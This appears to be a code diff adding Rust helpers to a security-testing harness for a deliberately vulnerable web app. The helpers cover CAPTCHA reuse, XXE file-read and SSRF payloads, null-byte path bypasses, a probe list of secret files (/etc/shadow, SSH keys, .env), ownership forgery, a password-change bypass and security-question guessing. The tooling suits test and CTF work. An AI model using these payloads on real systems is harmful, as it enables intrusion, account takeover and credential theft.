@@ -338,11 +338,18 @@ pub mod header_helpers {
 pub mod captcha_helpers {
     use super::*;
 
+    /// CAPTCHA data for reuse
+    #[derive(Debug, Clone)]
+    pub struct CaptchaData {
+        pub id: i64,
+        pub answer: String,
+    }
+
     /// Get CAPTCHA and solve it (for testing CAPTCHA bypass)
     pub async fn get_captcha(
         ctx: &Arc<ScenarioContext>,
         endpoint: &str,
-    ) -> Result<Option<(i64, String)>> {
+    ) -> Result<Option<CaptchaData>> {
         let resp = ctx.get(endpoint).send().await?;
 
         if resp.is_success()
@@ -355,7 +362,7 @@ pub mod captcha_helpers {
                 .unwrap_or("")
                 .to_string();
 
-            return Ok(Some((id, answer)));
+            return Ok(Some(CaptchaData { id, answer }));
         }
 
         Ok(None)
@@ -365,8 +372,7 @@ pub mod captcha_helpers {
     pub async fn test_captcha_reuse(
         ctx: &Arc<ScenarioContext>,
         submit_endpoint: &str,
-        captcha_id: i64,
-        captcha_answer: &str,
+        captcha: &CaptchaData,
         data: &serde_json::Value,
         attempts: usize,
     ) -> Result<usize> {
@@ -375,8 +381,8 @@ pub mod captcha_helpers {
         for _ in 0..attempts {
             let mut submit_data = data.clone();
             if let Some(obj) = submit_data.as_object_mut() {
-                obj.insert("captchaId".to_string(), serde_json::json!(captcha_id));
-                obj.insert("captcha".to_string(), serde_json::json!(captcha_answer));
+                obj.insert("captchaId".to_string(), serde_json::json!(captcha.id));
+                obj.insert("captcha".to_string(), serde_json::json!(captcha.answer));
             }
 
             let resp = ctx.post(submit_endpoint).json(&submit_data).send().await?;
@@ -387,6 +393,315 @@ pub mod captcha_helpers {
         }
 
         Ok(successful_reuses)
+    }
+}
+
+/// File upload helpers for multipart/form-data
+pub mod upload_helpers {
+    /// Build a multipart form-data body for file upload
+    ///
+    /// # Example
+    /// ```ignore
+    /// let body = build_multipart_body("file", "test.xml", "text/xml", "<test/>");
+    /// ctx.post("/upload")
+    ///     .header("Content-Type", &format!("multipart/form-data; boundary={}", BOUNDARY))
+    ///     .body(body)
+    ///     .send().await?;
+    /// ```
+    pub fn build_multipart_body(
+        field_name: &str,
+        filename: &str,
+        content_type: &str,
+        content: &str,
+    ) -> String {
+        format!(
+            "--{boundary}\r\n\
+             Content-Disposition: form-data; name=\"{field}\"; filename=\"{filename}\"\r\n\
+             Content-Type: {content_type}\r\n\r\n\
+             {content}\r\n\
+             --{boundary}--\r\n",
+            boundary = BOUNDARY,
+            field = field_name,
+            filename = filename,
+            content_type = content_type,
+            content = content
+        )
+    }
+
+    /// Standard boundary for multipart requests
+    pub const BOUNDARY: &str = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+
+    /// Content-Type header value for multipart with boundary
+    pub fn multipart_content_type() -> String {
+        format!("multipart/form-data; boundary={}", BOUNDARY)
+    }
+
+    /// Build XXE payload for file disclosure
+    pub fn xxe_file_read(file_path: &str) -> String {
+        format!(
+            r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{}">]>
+<root>&xxe;</root>"#,
+            file_path
+        )
+    }
+
+    /// Build XXE payload for SSRF
+    pub fn xxe_ssrf(url: &str) -> String {
+        format!(
+            r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]>
+<root>&xxe;</root>"#,
+            url
+        )
+    }
+}
+
+/// Forgery and parameter tampering helpers
+pub mod forgery_helpers {
+    use super::*;
+
+    /// Test user ID forgery in request body
+    ///
+    /// Attempts to submit data with a different user ID to test access control
+    pub async fn test_user_id_forgery(
+        ctx: &Arc<ScenarioContext>,
+        endpoint: &str,
+        method: &str,
+        token: &str,
+        user_id_field: &str,
+        target_user_id: serde_json::Value,
+        base_data: &serde_json::Value,
+    ) -> Result<bool> {
+        let mut data = base_data.clone();
+        if let Some(obj) = data.as_object_mut() {
+            obj.insert(user_id_field.to_string(), target_user_id);
+        }
+
+        let resp = match method.to_uppercase().as_str() {
+            "POST" => ctx.post(endpoint).bearer_auth(token).json(&data).send().await?,
+            "PUT" => ctx.put(endpoint).bearer_auth(token).json(&data).send().await?,
+            "PATCH" => {
+                // Use POST with method override for PATCH
+                ctx.post(endpoint)
+                    .header("X-HTTP-Method-Override", "PATCH")
+                    .bearer_auth(token)
+                    .json(&data)
+                    .send()
+                    .await?
+            }
+            _ => return Ok(false),
+        };
+
+        Ok(resp.is_success())
+    }
+
+    /// Test author/ownership forgery
+    pub async fn test_author_forgery(
+        ctx: &Arc<ScenarioContext>,
+        endpoint: &str,
+        token: &str,
+        forged_author: &str,
+        message: &str,
+    ) -> Result<bool> {
+        let data = serde_json::json!({
+            "message": message,
+            "author": forged_author
+        });
+
+        let resp = ctx.put(endpoint).bearer_auth(token).json(&data).send().await?;
+
+        Ok(resp.is_success())
+    }
+}
+
+/// File disclosure helpers (null byte, path traversal)
+pub mod file_disclosure {
+    use super::*;
+
+    /// Access file via null byte injection
+    ///
+    /// Tries multiple null byte encodings to bypass extension checks
+    pub async fn access_with_null_byte(
+        ctx: &Arc<ScenarioContext>,
+        base_path: &str,
+        target_file: &str,
+        fake_extension: &str,
+    ) -> Result<Option<SecurityResponse>> {
+        let payloads = [
+            format!("{}/{}%00.{}", base_path, target_file, fake_extension),
+            format!("{}/{}%2500.{}", base_path, target_file, fake_extension),
+            format!("{}/{}%252500.{}", base_path, target_file, fake_extension),
+        ];
+
+        for payload in &payloads {
+            let resp = ctx.get(payload).send().await?;
+            if resp.is_success() {
+                return Ok(Some(resp));
+            }
+        }
+
+        Ok(None)
+    }
+
+    /// Common sensitive files to probe
+    pub fn sensitive_file_paths() -> Vec<&'static str> {
+        vec![
+            "/etc/passwd",
+            "/etc/shadow",
+            "/proc/self/environ",
+            "/proc/self/cmdline",
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "~/.ssh/id_rsa",
+            "~/.bash_history",
+            "/var/log/auth.log",
+            "package.json",
+            ".env",
+            ".git/config",
+            "wp-config.php",
+            "config.php",
+            "database.yml",
+        ]
+    }
+
+    /// Common backup file extensions
+    pub fn backup_extensions() -> Vec<&'static str> {
+        vec![".bak", ".backup", ".old", ".orig", ".save", ".swp", "~", ".copy"]
+    }
+}
+
+/// OSINT helpers for security question attacks
+pub mod osint_helpers {
+    /// Common security question answer patterns
+    ///
+    /// Based on patterns observed in CTF challenges
+    pub fn common_answers_for_category(category: &str) -> Vec<&'static str> {
+        match category.to_lowercase().as_str() {
+            "pet" | "pet_name" | "favorite_pet" => vec![
+                "Fluffy", "Max", "Buddy", "Charlie", "Rocky", "Bear", "Duke", "Zaya",
+            ],
+            "city" | "birth_city" | "hometown" => vec![
+                "New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "London", "Tokyo",
+            ],
+            "movie" | "favorite_movie" => vec![
+                "Star Wars",
+                "The Godfather",
+                "Pulp Fiction",
+                "The Matrix",
+                "Silence of the Lambs",
+                "Inception",
+            ],
+            "company" | "employer" | "first_job" => vec![
+                "McDonald's",
+                "Walmart",
+                "Amazon",
+                "Google",
+                "Stop'n'Drop",
+                "Initech",
+            ],
+            "sibling" | "brother" | "sister" => {
+                vec!["John", "James", "Michael", "David", "Samuel", "Robert", "Mary", "Sarah"]
+            }
+            "mother_maiden" => vec![
+                "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
+            ],
+            _ => vec![],
+        }
+    }
+
+    /// Character reference answers (from pop culture)
+    ///
+    /// Many CTFs use fictional character backstories
+    pub fn pop_culture_references() -> std::collections::HashMap<&'static str, Vec<(&'static str, &'static str)>>
+    {
+        let mut refs = std::collections::HashMap::new();
+
+        // Star Trek references
+        refs.insert(
+            "star_trek",
+            vec![
+                ("ship", "NCC-1701"),
+                ("ship", "Enterprise"),
+                ("captain", "Kirk"),
+                ("captain", "Picard"),
+            ],
+        );
+
+        // Futurama references
+        refs.insert(
+            "futurama",
+            vec![
+                ("employer", "Stop'n'Drop"),
+                ("employer", "Planet Express"),
+                ("drink", "Slurm"),
+            ],
+        );
+
+        // Hunter x Hunter
+        refs.insert(
+            "hunter_x_hunter",
+            vec![("movie", "Silence of the Lambs"), ("ability", "Nen")],
+        );
+
+        refs
+    }
+}
+
+/// Parameter omission helpers
+pub mod omission_helpers {
+    use super::*;
+
+    /// Test if a required parameter can be omitted
+    ///
+    /// Some endpoints fail to validate required parameters,
+    /// allowing bypass (e.g., omitting 'current' password)
+    pub async fn test_parameter_omission(
+        ctx: &Arc<ScenarioContext>,
+        endpoint: &str,
+        method: &str,
+        token: &str,
+        full_params: &[(&str, &str)],
+        param_to_omit: &str,
+    ) -> Result<bool> {
+        let params: Vec<(&str, &str)> = full_params
+            .iter()
+            .filter(|(k, _)| *k != param_to_omit)
+            .copied()
+            .collect();
+
+        let mut req = match method.to_uppercase().as_str() {
+            "GET" => ctx.get(endpoint),
+            "POST" => ctx.post(endpoint),
+            "PUT" => ctx.put(endpoint),
+            _ => return Ok(false),
+        };
+
+        req = req.bearer_auth(token);
+        for (k, v) in params {
+            req = req.query(k, v);
+        }
+
+        let resp = req.send().await?;
+        Ok(resp.is_success())
+    }
+
+    /// Test password change without current password
+    pub async fn test_password_change_bypass(
+        ctx: &Arc<ScenarioContext>,
+        endpoint: &str,
+        token: &str,
+        new_password: &str,
+    ) -> Result<bool> {
+        // Try omitting 'current' parameter
+        let resp = ctx
+            .get(endpoint)
+            .bearer_auth(token)
+            .query("new", new_password)
+            .query("repeat", new_password)
+            .send()
+            .await?;
+
+        Ok(resp.is_success())
     }
 }
 
